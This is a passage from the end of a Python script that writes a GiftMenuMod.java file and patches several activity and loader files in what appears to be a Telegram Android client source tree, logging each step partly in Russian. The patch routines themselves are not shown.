        log("ERROR: TMessagesProj не найден")
        return 1

    write(MOD_PATH, build_java())
    log("GiftMenuMod.java OK — полный функционал")

    al = find_java("ApplicationLoader.java")
    if al:
        log(f"patch {al.name}")
        patch_file(al, patch_application_loader)

    # LaunchActivity — главная точка входа
    la = find_java("LaunchActivity.java")
    if la:
        log(f"patch {la.name}")
        patch_file(la, patch_launch)
    else:
        log("WARN: LaunchActivity.java not found")

    for name in ("LoginActivity.java", "IntroActivity.java"):
        p = find_java(name)
        if p:
            log(f"patch {p.name}")
            patch_file(p, patch_login_like)

    d = find_java("DialogsActivity.java")
    if d:
        log(f"patch {d.name}")
        patch_file(d, patch_dialogs)

    gs = find_java("GiftSheet.java")
    if gs:
        log(f"patch {gs.name}")
        patch_file(gs, patch_gift_sheet)
    else:
        log("WARN: GiftSheet.java not found")

    log("DONE — полный функционал вписан")
    return 0


if __name__ == "__main__":
    sys.exit(main())
